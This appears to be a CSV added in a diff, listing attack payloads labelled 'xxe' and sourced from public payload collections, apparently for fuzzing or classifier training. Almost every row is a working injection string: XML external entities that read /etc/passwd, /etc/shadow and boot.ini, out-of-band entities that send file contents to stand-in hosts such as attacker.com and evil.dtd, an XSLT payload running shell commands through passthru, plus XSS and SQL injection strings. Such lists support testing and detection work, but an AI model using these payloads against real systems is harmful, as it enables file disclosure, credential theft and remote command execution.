+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///c:/boot.ini"" >]><foo>&xxe;</foo> <?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM ""http://www.attacker.com/text.txt"">]><foo>&xxe;</foo>",xxe,payloads_all_the_things
+}}</script><script>alert(1);</script></body></html><!--,xxe,payloads_all_the_things
+"""}}</script>'",xxe,payloads_all_the_things
+"}}</script>""""'""",xxe,payloads_all_the_things
+"<?xml version=""1.0"" standalone=""yes""?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM ""file:///etc/passwd"" > ]><svg width=""500px"" height=""40px"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" version=""1.1"">&xxe;</svg>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" standalone=""yes""?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM ""file:///etc/passwd"" > ]><svg width=""500px"" height=""100px"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" version=""1.1""><text font-family=""Verdana"" font-size=""16"" x=""10"" y=""40"">&xxe;</text></svg>",xxe,payloads_all_the_things
+<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>,xxe,payloads_all_the_things
+"<!DOCTYPE xxe [<!ENTITY foo ""aaaaaa"">]>",xxe,payloads_all_the_things
+"<!DOCTYPE xxe [<!ENTITY foo ""aaaaaa"">]><root>&foo;</root>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE xxe [<!ENTITY foo ""aaaaaa"">]>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE xxe [<!ENTITY foo ""aaaaaa"">]><root>&foo;</root>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><test></test>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/issue"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/issue"" >]>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/shadow"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/shadow"" >]>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///c:/boot.ini"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///c:/boot.ini"" >]>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""http://example.com:80"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""http://example:443"" >]>",xxe,payloads_all_the_things
+<test></test>,xxe,payloads_all_the_things
+<![CDATA[<test></test>]]>,xxe,payloads_all_the_things
+&foo;,xxe,payloads_all_the_things
+%foo;,xxe,payloads_all_the_things
+<foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>,xxe,payloads_all_the_things
+<foo><![CDATA[' or 1=1 or ''=']]></foo>,xxe,payloads_all_the_things
+"<xml SRC=""xsstest.xml"" ID=I></xml>",xxe,payloads_all_the_things
+"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc"">",xxe,payloads_all_the_things
+"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:php=""http://php.net/xsl""><xsl:template match=""/""><script>alert(123)</script></xsl:template></xsl:stylesheet>",xxe,payloads_all_the_things
+"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:php=""http://php.net/xsl""><xsl:template match=""/""><xsl:copy-of select=""document('/etc/passwd')""/></xsl:template></xsl:stylesheet>",xxe,payloads_all_the_things
+"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:php=""http://php.net/xsl""><xsl:template match=""/""><xsl:value-of select=""php:function('passthru','ls -la')""/></xsl:template></xsl:stylesheet>",xxe,payloads_all_the_things
+"<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]>",xxe,payloads_all_the_things
+"<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/shadow"" >]>",xxe,payloads_all_the_things
+"<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///c:/boot.ini"" >]>",xxe,payloads_all_the_things
+"<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""http://example.com/text.txt"" >]>",xxe,payloads_all_the_things
+"<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////dev/random"">]>",xxe,payloads_all_the_things
+"<!ENTITY % int ""<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1:80/?%file;'>  ""> %int;",xxe,payloads_all_the_things
+"<!DOCTYPE xxe [ <!ENTITY % file SYSTEM ""file:///etc/issue""><!ENTITY % dtd SYSTEM ""http://example.com/evil.dtd"">%dtd;%trick;]>",xxe,payloads_all_the_things
+"<!DOCTYPE xxe [ <!ENTITY % file SYSTEM ""file:///c:/boot.ini""><!ENTITY % dtd SYSTEM ""http://example.com/evil.dtd"">%dtd;%trick;]>",xxe,payloads_all_the_things
+"<!ENTITY % xxe SYSTEM ""php://filter/convert.base64-encode/resource=/etc/passwd"" >",xxe,seclists
+"<!ENTITY % int ""<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1:80/?%file;'>  ""> %int;",xxe,seclists
+"<!ENTITY % param3 ""<!ENTITY &#x25; exfil SYSTEM 'ftp://127.0.0.1:21/%data3;'>"">",xxe,seclists
+"<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM ""http://x.x.x.x:22/""> %dtd;]><xxx/>]]></foo></soap:Body>",xxe,seclists
